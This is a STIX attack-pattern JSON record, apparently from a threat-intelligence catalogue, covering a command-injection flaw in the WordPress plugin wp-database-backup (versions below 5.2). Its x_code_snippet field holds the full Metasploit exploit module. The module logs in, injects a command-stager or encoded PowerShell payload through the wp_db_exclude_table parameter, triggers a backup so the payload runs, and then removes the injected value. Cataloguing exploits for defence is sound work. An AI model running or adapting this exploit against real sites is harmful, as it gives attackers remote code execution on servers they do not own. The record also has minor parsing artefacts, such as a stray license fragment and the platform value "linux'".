{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b79c94b2-7a6b-4aa3-b92d-72f153804621",
    "created": "2024-08-14T17:08:09.830187Z",
    "modified": "2024-08-14T17:08:09.830191Z",
    "name": "WP Database Backup RCE",
    "description": "( There exists a command injection vulnerability in the Wordpress plugin `wp-database-backup` for versions < 5.2.  For the backup functionality, the plugin generates a `mysqldump` command to execute. The user can choose specific tables to exclude from the backup by setting the `wp_db_exclude_table` parameter in a POST request to the `wp-database-backup` page. The names of the excluded tables are included in the `mysqldump` command unsanitized. Arbitrary commands injected through the `wp_db_exclude_table` parameter are executed each time the functionality for creating a new database backup are run.  Authentication is required to successfully exploit this vulnerability. ) 'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/wp_db_backup_rce.rb",
            "external_id": "wp_db_backup_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.wordfence.com/blog/2019/05/os-command-injection-vulnerability-patched-in-wp-database-backup-plugin/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Powershell\n  include Msf::Exploit::Remote::HTTP::Wordpress\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WP Database Backup RCE',\n      'Description'    => %q(\n        There exists a command injection vulnerability in the Wordpress plugin\n        `wp-database-backup` for versions < 5.2.\n\n        For the backup functionality, the plugin generates a `mysqldump` command\n        to execute. The user can choose specific tables to exclude from the backup\n        by setting the `wp_db_exclude_table` parameter in a POST request to the\n        `wp-database-backup` page. The names of the excluded tables are included in\n        the `mysqldump` command unsanitized. Arbitrary commands injected through the\n        `wp_db_exclude_table` parameter are executed each time the functionality\n        for creating a new database backup are run.\n\n        Authentication is required to successfully exploit this vulnerability.\n      ),\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n      [\n        'Mikey Veenstra / Wordfence',  # Vulnerability Discovery\n        'Shelby Pace'                  # Metasploit module\n      ],\n      'References'     =>\n        [\n          [ 'URL', 'https://www.wordfence.com/blog/2019/05/os-command-injection-vulnerability-patched-in-wp-database-backup-plugin/' ],\n        ],\n      'Platform'       => [ 'win', 'linux' ],\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'Targets'        =>\n        [\n          [\n            'Windows',\n            {\n              'Platform'        => 'win',\n              'Arch'            => [ ARCH_X86, ARCH_X64 ]\n            }\n          ],\n          [\n            'Linux',\n            {\n              'Platform'        =>  'linux',\n              'Arch'            =>  [ ARCH_X86, ARCH_X64 ],\n              'CmdStagerFlavor' =>  'printf'\n            }\n          ]\n        ],\n      'DisclosureDate' => '2019-04-24',\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n    [\n      OptString.new('USERNAME', [ true, 'Wordpress username', '' ]),\n      OptString.new('PASSWORD', [ true, 'Wordpress password', '' ]),\n      OptString.new('TARGETURI', [ true, 'Base path to Wordpress installation', '/' ])\n    ])\n  end\n\n  def check\n    return CheckCode::Unknown unless wordpress_and_online?\n\n    changelog_uri = normalize_uri(target_uri.path, 'wp-content', 'plugins', 'wp-database-backup', 'readme.txt')\n    res = send_request_cgi(\n      'method'  =>  'GET',\n      'uri'     =>  changelog_uri\n    )\n\n    if res && res.code == 200\n      version = res.body.match(/=+\\s(\\d+\\.\\d+)\\.?\\d*\\s=/)\n      return CheckCode::Detected unless version && version.length > 1\n\n      vprint_status(\"Version of wp-database-backup detected: #{version[1]}\")\n      return CheckCode::Appears if Rex::Version.new(version[1]) < Rex::Version.new('5.2')\n    end\n    CheckCode::Safe\n  end\n\n  def exploit\n    cookie = wordpress_login(datastore['USERNAME'], datastore['PASSWORD'])\n    fail_with(Failure::NoAccess, 'Unable to log into Wordpress') unless cookie\n\n    res = create_exclude_table(cookie)\n    nonce = get_nonce(res)\n    create_backup(cookie, nonce)\n\n    clear_exclude_table(cookie)\n  end\n\n  def create_exclude_table(cookie)\n    @exclude_uri = normalize_uri(target_uri.path, 'wp-admin', 'tools.php')\n    res = send_request_cgi(\n      'method'    =>  'GET',\n      'uri'       =>  @exclude_uri,\n      'cookie'    =>  cookie,\n      'vars_get'  =>  { 'page'  =>  'wp-database-backup' }\n    )\n\n    fail_with(Failure::NotFound, 'Unable to reach the wp-database-backup settings page') unless res && res.code == 200\n    print_good('Reached the wp-database-backup settings page')\n    if datastore['TARGET'] == 1\n      comm_payload = generate_cmdstager(concat_operator: ' && ', temp: './')\n      comm_payload = comm_payload.join('&&')\n      comm_payload = comm_payload.gsub('\\'', '')\n      comm_payload = \"; #{comm_payload} ;\"\n    else\n      comm_payload = \" & #{cmd_psh_payload(payload.encoded, payload.arch, remove_comspec: true, encode_final_payload: true)} & ::\"\n    end\n\n    table_res = send_request_cgi(\n      'method'    =>  'POST',\n      'uri'       =>  @exclude_uri,\n      'cookie'    =>  cookie,\n      'vars_post' =>\n      {\n        'wpsetting'                       =>  'Save',\n        'wp_db_exclude_table[wp_comment]' =>  comm_payload\n      }\n    )\n\n    fail_with(Failure::UnexpectedReply, 'Failed to submit payload as an excluded table') unless table_res && table_res.code\n    print_good('Successfully added payload as an excluded table')\n\n    res.get_html_document\n  end\n\n  def get_nonce(response)\n    fail_with(Failure::UnexpectedReply, 'Failed to get a proper response') unless response\n\n    div_res = response.at('p[@class=\"submit\"]')\n    fail_with(Failure::NotFound, 'Failed to find the element containing the nonce') unless div_res\n\n    wpnonce = div_res.to_s.match(/_wpnonce=([0-9a-z]*)/)\n    fail_with(Failure::NotFound, 'Failed to retrieve the wpnonce') unless wpnonce && wpnonce.length > 1\n\n    wpnonce[1]\n  end\n\n  def create_backup(cookie, nonce)\n    first_res = send_request_cgi(\n      'method'    =>  'GET',\n      'uri'       =>  @exclude_uri,\n      'cookie'    =>  cookie,\n      'vars_get'  =>\n      {\n        'page'      =>  'wp-database-backup',\n        '_wpnonce'  =>  nonce,\n        'action'    =>  'createdbbackup'\n      }\n    )\n\n    res = send_request_cgi(\n      'method'    =>  'GET',\n      'uri'       =>  @exclude_uri,\n      'cookie'    =>  cookie,\n      'vars_get'  =>\n      {\n        'page'          =>  'wp-database-backup',\n        'notification'  =>  'create'\n      }\n    )\n\n    fail_with(Failure::UnexpectedReply, 'Failed to create database backup') unless res && res.code == 200 && res.body.include?('Database Backup Created Successfully')\n    print_good('Successfully created a backup of the database')\n  end\n\n  def clear_exclude_table(cookie)\n    res = send_request_cgi(\n      'method'    =>  'POST',\n      'uri'       =>  @exclude_uri,\n      'cookie'    =>  cookie,\n      'vars_post' =>\n      {\n        'wpsetting'                       =>  'Save',\n        'wp_db_exclude_table[wp_comment]' =>  'wp_comment'\n      }\n    )\n\n   fail_with(Failure::UnexpectedReply, 'Failed to delete the remove the payload from the excluded tables') unless res && res.code == 200\n   print_good('Successfully deleted the payload from the excluded tables list')\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-04-24",
    "x_mitre_platforms": [
        "linux'"
    ]
}